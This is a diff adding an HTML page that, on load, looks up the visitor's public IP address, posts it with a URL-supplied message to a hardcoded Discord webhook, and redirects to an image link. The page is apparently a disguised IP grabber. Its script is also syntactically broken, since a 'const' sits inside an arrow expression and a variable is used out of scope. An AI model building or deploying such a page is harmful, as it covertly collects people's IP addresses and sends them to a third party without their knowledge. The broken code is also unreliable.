@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta property="og:image" content=image>
+<script>
+  fetch('https://api.ipify.org/')  .then(response => response.text())  .then(script => const ip = script);
+function sendWebhook(url, message) {
+  // Replace with your actual Discord webhook URL
+  const webhookURL = "https://discord.com/api/webhooks/1210975688002240613/MfdO7_ih-VtdQZGv0D-Dt_3jvvT1UgDok1-j0q31xyVCDAC8jaaLEk5wByC-e443SrNa";
+
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: script + " " + message })
+  })
+  .then(response => console.log("Webhook sent!"))
+  .catch(error => console.error("Error sending webhook:", error));
+}
+
+function redirectAndSendWebhook() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const image = urlParams.get("image");
+  const message = urlParams.get("message");
+
+  if (image) {
+    window.location.href = image;
+    sendWebhook("YOUR_DISCORD_WEBHOOK_URL", message);
+  }
+}
+
+// Call the function when the page loads
+redirectAndSendWebhook();
+</script>
+</head>
+<body>
+</body>
+</html>
